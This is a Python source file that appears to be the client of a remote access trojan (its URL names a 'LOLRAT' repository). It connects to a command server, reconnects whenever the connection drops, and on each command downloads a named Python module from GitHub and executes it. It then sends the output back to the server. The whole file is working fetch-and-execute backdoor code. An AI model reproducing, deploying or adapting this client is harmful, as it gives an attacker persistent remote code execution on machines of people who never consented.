import os
import socket
import subprocess
import requests
import time

def fetch_url_and_execute_cmd(url, args):
    try:
        response = requests.get(url)
        
        if response.status_code == 200:
            content = response.text

            # Execute the content as a Python script with arguments using subprocess
            command = ["python", "-c", content] + args  # Combine command and arguments
            print(f"Executing command: {command}")
            result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            # Get the output of the executed command
            output = result.stdout if result.returncode == 0 else result.stderr
            return output
        else:
            return f"Failed to retrieve content from the URL. Status Code: {response.status_code}"
    except Exception as e:
        return f"An error occurred: {e}"

# The host and port to connect to
host = "127.0.0.1"  # Replace with the actual server IP address
port = 12345  # Replace with the actual port the server is listening on

while True:
    try:
        # Establish connection with the server
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.connect((host, port))
            print("Connected to the server")

            # Listen for commands indefinitely
            while True:
                # Receive a command from the server
                command = client_socket.recv(1024).decode('utf-8')

                # Split the received command to get the module and arguments
                before, after = command.split("$")

                # Convert 'after' to a list with one element
                arguments = [after]

                # Make url
                url = f"https://raw.githubusercontent.com/WilleLX1/LOLRAT/main/Modules/{before}.py"

                # Fetch and execute with the converted arguments list
                output = fetch_url_and_execute_cmd(url, arguments)

                # Send the output back to the server
                client_socket.send(output.encode('utf-8'))
    except ConnectionRefusedError:
        print("Connection refused. Retrying in 5 seconds...")
        time.sleep(5)  # Wait for 5 seconds before retrying
    except Exception as e:
        print(f"An error occurred: {e}")